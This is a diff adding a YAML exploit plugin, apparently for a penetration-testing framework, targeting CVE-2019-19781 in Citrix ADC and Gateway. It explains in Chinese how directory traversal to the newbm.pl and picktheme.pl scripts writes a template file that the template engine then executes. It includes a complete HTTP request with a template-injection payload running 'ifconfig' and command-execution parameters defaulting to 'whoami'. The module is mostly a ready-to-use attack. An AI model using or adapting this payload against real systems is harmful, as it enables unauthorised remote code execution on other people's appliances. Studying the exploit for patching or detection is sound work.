@@ -1,0 +1,57 @@
+info:
+    app: Citrix
+    name: CVE_2019_19781
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2019-12-13"
+    create_date: "2024-10-06 06:35:05"
+    update_date: "2024-10-06 06:35:05"
+    scope: |-
+        Citrix Application Delivery Controller (ADC) and Gateway 10.5
+        Citrix Application Delivery Controller (ADC) and Gateway 11.1
+        Citrix Application Delivery Controller (ADC) and Gateway 12.0
+        Citrix Application Delivery Controller (ADC) and Gateway 12.1
+        Citrix Application Delivery Controller (ADC) and Gateway 13.0
+    description: Citrix公司的 ADC (Application Delivery Controller, 也叫NetScaler ADC) 和 Gateway (也叫 NetScaler Gateway) 被爆出可通过目录遍历执行远程代码的漏洞。
+    vul_id: CVE-2019-19781
+    detail: |-
+        漏洞利用在于，先通过目录穿越访问/vpns/下的perl脚本，其中有几个可写文件的脚本，而文件名通过请求头的NSC_USER来控制，将文件写到templates目录下，自动添加.xml后缀，访问xml文件就会被模板引擎解析从而导致命令执行。
+        路径如下
+        POST /vpn/../vpns/portal/scripts/newbm.pl
+        POST /vpn/../vpns/portal/scripts/rmbm.pl
+        GET /vpn/../vpns/portal/scripts/picktheme.pl
+
+        	推荐payload1，不会有太多编码问题， 输入命令等待结果即可
+        	payload1: 请求 /vpn/../vpns/portal/scripts/newbm.pl
+        	payload2: 请求 /vpn/../vpns/portal/scripts/picktheme.pl
+
+        PS: 这个漏洞利用存在一个问题，写一次文件，马上写第二次可能会失败，佛系测试
+    payload: |
+        POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1
+        Host: x.x.x.x
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        User-Agent: python-requests/2.24.0
+        NSC_NONCE: nsroot
+        NSC_USER: ../../../netscaler/portal/templates/84aaaf61
+        Content-Length: 106
+
+        url=http://example.com&title=84aaaf61&desc=[% template.new('BLOCK' = 'print ` + "`ifconfig`" + `') %]
+payloads:
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+    - name: cmd2
+      alias: 命令执行2
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
